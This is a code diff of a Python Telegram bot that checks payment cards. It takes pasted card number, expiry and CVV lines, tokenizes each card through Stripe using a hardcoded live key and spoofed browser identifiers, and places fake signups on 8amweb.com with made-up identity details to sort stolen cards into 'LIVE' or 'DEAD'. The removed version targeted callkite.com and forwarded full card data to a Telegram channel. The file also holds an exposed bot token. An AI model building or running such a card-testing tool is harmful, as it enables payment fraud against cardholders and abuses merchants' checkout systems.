@@ -2,123 +2,146 @@ import telebot
 import requests
 import random
 import string
-import json
+import time
 
 BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
-CHANNEL_ID = -1002170961342
 bot = telebot.TeleBot(BOT_TOKEN)
 
-STRIPE_PUBLISHABLE_KEY = "pk_live_aS5XfyascG0bAVDXZDAZdX4j"
+STRIPE_PUBLISHABLE_KEY = "pk_live_4CKMbP1u5l354SB3pNjQ9iii"
+EIGHTAMWEB_URL = "https://www.8amweb.com/signup.php"
+
+def generate_random_string(length=8):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
 def generate_random_email():
-    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    return f"{name}@gmail.com"
+    return generate_random_string() + "@gmail.com"
+
+def generate_random_subdomain():
+    return generate_random_string(10)
 
 def parse_card_input(text):
     parts = text.strip().split('|')
     if len(parts) != 4:
         return None
-    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
-    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
+    cc, mm, yy, cvv = map(str.strip, parts)
+    if not (cc.isdigit() and mm.isdigit() and cvv.isdigit() and (len(yy) == 2 or len(yy) == 4)):
         return None
-    return card_number, exp_month.zfill(2), exp_year, cvc
+    if len(yy) == 2:
+        yy = "20" + yy
+    return cc, mm.zfill(2), yy, cvv
 
-def send_long_message(chat_id, text):
-    max_length = 4096
-    for i in range(0, len(text), max_length):
-        bot.send_message(chat_id, text[i:i+max_length])
+def check_card(cc, mm, yy, cvv):
+    guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+    muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+    sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+    time_on_page = str(random.randint(10000, 99999))
+    payment_user_agent = "stripe.js/78ef418"
+    email = generate_random_email()
+    subdomain = generate_random_subdomain()
+    name = "Peshang Salam"
+    phone = "3144740104"
+    zip_code = "08107"
+    city = "3144740104"
+    company = "Kurd"
+    address = "198 White Horse Pike"
+    state = "NJ"
+    country = "US"
+    password = "War112233$%"
+
+    # Step 1: Create Stripe token
+    stripe_data = {
+        "time_on_page": time_on_page,
+        "pasted_fields": "number",
+        "guid": guid,
+        "muid": muid,
+        "sid": sid,
+        "key": STRIPE_PUBLISHABLE_KEY,
+        "payment_user_agent": payment_user_agent,
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_month]": mm,
+        "card[exp_year]": yy,
+    }
+    stripe_headers = {
+        "content-type": "application/x-www-form-urlencoded",
+        "accept": "application/json",
+        "origin": "https://js.stripe.com",
+        "referer": "https://js.stripe.com/",
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
+    }
+    try:
+        stripe_resp = requests.post("https://api.stripe.com/v1/tokens", data=stripe_data, headers=stripe_headers)
+        stripe_json = stripe_resp.json()
+        stripe_token = stripe_json.get("id", "")
+        if not stripe_token or not stripe_token.startswith("tok_"):
+            return f"❌ Stripe error: {stripe_json.get('error', {}).get('message', stripe_json)}"
+    except Exception as e:
+        return f"❌ Stripe error: {str(e)}"
+
+    # Step 2: Post to 8amweb
+    web_headers = {
+        "content-type": "application/x-www-form-urlencoded",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "origin": "https://www.8amweb.com",
+        "referer": "https://www.8amweb.com/signup.php",
+        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
+    }
+    web_data = {
+        "subdomain": subdomain,
+        "item": "item_1",
+        "name": name,
+        "email": email,
+        "reg_password": password,
+        "reg_password_confirmation": password,
+        "account_info": "1",
+        "company": company,
+        "address": address,
+        "country": country,
+        "state": state,
+        "city": city,
+        "zip": zip_code,
+        "phone": phone,
+        "pay_type": "card",
+        "stripeToken": stripe_token,
+        "terms_and_policies": "1",
+        "timezoneoffset": "-180",
+        "lang": "en-US",
+        "main_page": "aa3c7efbd24cb4db235cbffd1a891d47",
+        "auth_key": ""
+    }
+    try:
+        web_resp = requests.post(EIGHTAMWEB_URL, data=web_data, headers=web_headers)
+        text = web_resp.text
+        if "Payment Failed" in text:
+            return f"❌ DEAD: {cc}|{mm}|{yy}|{cvv} (Payment Failed)"
+        else:
+            return f"✅ LIVE: {cc}|{mm}|{yy}|{cvv}"
+    except Exception as e:
+        return f"❌ 8amweb error: {str(e)}"
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
-        "💳 CallKite Card Checker\n"
-        "Send card details in one of these formats:\n"
-        "CardNumber|MM|YY|CVC\n"
-        "CardNumber|MM|YYYY|CVC\n"
-        "Example:\n5275150097242499|09|28|575"
+        "💳 Welcome to the 8amweb Card Checker Bot!\n"
+        "Send one or multiple cards separated by new lines.\n"
+        "Each card must be in the format:\n"
+        "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n\n"
+        "Example:\n"
+        "4242424242424242|05|25|123\n"
+        "5108750563572478|06|2029|269"
     )
 
-@bot.message_handler(func=lambda m: True)
+@bot.message_handler(func=lambda message: True)
 def card_handler(message):
-    try:
-        parsed = parse_card_input(message.text)
+    cards = message.text.strip().split('\n')
+    for card_line in cards:
+        parsed = parse_card_input(card_line)
         if not parsed:
-            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")
-
-        card_number, exp_month, exp_year, cvc = parsed
-        if len(exp_year) == 2:
-            exp_year = "20" + exp_year
-
-        email = generate_random_email()
-        plan = "monthly"
-
-        stripe_data = {
-            "card[number]": card_number,
-            "card[cvc]": cvc,
-            "card[exp_month]": exp_month,
-            "card[exp_year]": exp_year,
-            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
-            "time_on_page": str(random.randint(10000, 99999)),
-            "referrer": "https://callkite.com",
-            "key": STRIPE_PUBLISHABLE_KEY
-        }
-
-        stripe_resp = requests.post(
-            "https://api.stripe.com/v1/tokens",
-            data=stripe_data,
-            headers={
-                "content-type": "application/x-www-form-urlencoded",
-                "accept": "application/json",
-                "origin": "https://js.stripe.com",
-                "referer": "https://js.stripe.com/"
-            }
-        )
-        stripe_json = stripe_resp.json()
-
-        if "error" in stripe_json:
-            return bot.reply_to(message, f"❌ Stripe Decline:\n{stripe_json['error'].get('message', 'Unknown error')}")
-
-        token = stripe_json.get("id")
-        if not token or not token.startswith("tok_"):
-            return bot.reply_to(message, f"❌ Failed to get Stripe token:\n{stripe_json}")
-
-        signup_payload = {
-            "email": email,
-            "token": token,
-            "plan": plan
-        }
-        signup_resp = requests.post(
-            "https://callkite.com/api/signup",
-            json=signup_payload,
-            headers={
-                "content-type": "application/json",
-                "accept": "*/*",
-                "origin": "https://callkite.com",
-                "referer": "https://callkite.com/signup"
-            }
-        )
-        signup_json = signup_resp.json()
-
-        if signup_json.get("success") is True:
-            subscription_id = signup_json.get("subscription", {}).get("id", "N/A")
-            summary_msg = (
-                f"✅ Payment Successful!\n"
-                f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
-                f"Subscription ID: {subscription_id}\n"
-                f"Email used: {email}\n"
-            )
-            bot.reply_to(message, "✅ Your Card Was Added")
-            bot.send_message(CHANNEL_ID, summary_msg)
-
-            full_response_str = json.dumps(signup_json, indent=2)
-            send_long_message(CHANNEL_ID, f"Full Response:\n{full_response_str}")
-        else:
-            bot.reply_to(message, f"❌ Decline or Error:\n{signup_json.get('message', 'Unknown error')}")
-
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
+            bot.send_message(message.chat.id, f"❌ Invalid format: {card_line}")
+            continue
+        cc, mm, yy, cvv = parsed
+        result = check_card(cc, mm, yy, cvv)
+        bot.send_message(message.chat.id, result)
+        time.sleep(10)  # 10 seconds delay between cards
 
 bot.infinity_polling()
